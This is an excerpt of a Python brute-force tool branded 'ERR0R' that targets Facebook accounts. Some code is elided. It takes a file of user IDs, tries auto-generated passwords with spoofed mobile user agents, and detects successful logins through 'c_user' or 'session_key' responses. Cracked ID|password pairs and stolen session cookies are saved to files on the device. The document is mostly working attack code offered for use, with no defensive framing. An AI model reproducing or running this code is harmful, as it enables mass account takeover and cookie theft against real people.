...
logo=("""
 ...
 \33[1;31m ______ _____  _____   ____  _____  
 \33[1;31m|  ____|  __ \|  __ \ / __ \|  __ \ 
 \33[1;31m| |__  | |__) | |__) | |  | | |__) |
 \33[1;31m|  __| |  _  /|  _  /| |  | |  _  / 
 \33[1;31m| |____| | \ \| | \ \| |__| | | \ \ 
 \33[1;31m|______|_|  \_\_|  \_\\_____/|_|  \_\\
                                     
                                     

\033[1;96m ﹎﹎﹎﹎﹎﹎ \033[1;31mERR0R\033[1;96m ﹎﹎﹎﹎﹎﹎
\x1b[1;36m① \x1b[1;91mTool Created By  \x1b[1;97m:Mr.ERR0R
\x1b[1;36m② \x1b[1;93mTool Mode\x1b[1;92m\x1b[1;97m : \x1b[1;93mFILE-CLONE/ \x1b[1;92mERR0R ✓
\x1b[1;36m③ \x1b[1;90mTool Version \x1b[1;97m: \x1b[1;90m 3.00
\x1b[1;36m④ \x1b[1;93mTELEGRAM \x1b[1;97m: @itzErr0r
\033[38;5;46m⑤ \x1b[1;96mTool Status \33[38;5;196m: 😈 - 💀 FREE\33[38;5;196m 
\033[1;96m .﹎﹎﹎﹎﹎﹎ \033[1;31mBOSS\033[1;96m ﹎﹎﹎﹎﹎﹎. """)
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print('\033[1;37m[🟧] 𝑆𝑇𝐴𝑇𝑈𝑆   : \033[1;32m＄\n------------------------------------------\n\033[1;35m [ 1 ] 𝐶𝑟𝑎𝑐𝑘 𝑊𝑖𝑡ℎ 𝐹𝑖𝑙𝑒  \033[1;32m[𝑉𝐼𝑃]\n------------------------------------------ ')
                        linex()
                        xd=input('\033[1;35m[=] \033[1;37m𝐶𝐻𝑂𝑂𝑆𝐸 : ')
                        if xd in ['1','01']:
                               
                                linex()
                                file = input('Example ➔ : \033[1;32m‌/sdcard/ERR0R.txt\n----------------------------------------------\nPaste Your File : \033[1;32m  ')
                                try:
                                        ...
                                        menu()
                                linex()
                                print('\x1b[1;92mTelegram ➔ @ itzerr0r\n ----------------------------------------------\n [ 1 ] \033[1;32mCrack Auto Password')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32mERR0R\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
        sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m ERR0R%s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/ERR0R-COOKIE.txt','a').write(coki+'\n')
                                ...
                                if 'y' in pcp:
                                        ...
                                        open('/sdcard/ERR0R-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [ERR0R] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def api1(ids,names,passlist):
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m 𝐉ERR0R-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ERR0R-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m 𝐉ERR0R-OK '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/ERR0R-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/ERR0R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m 𝐉ERR0R-CP'+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ERR0R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
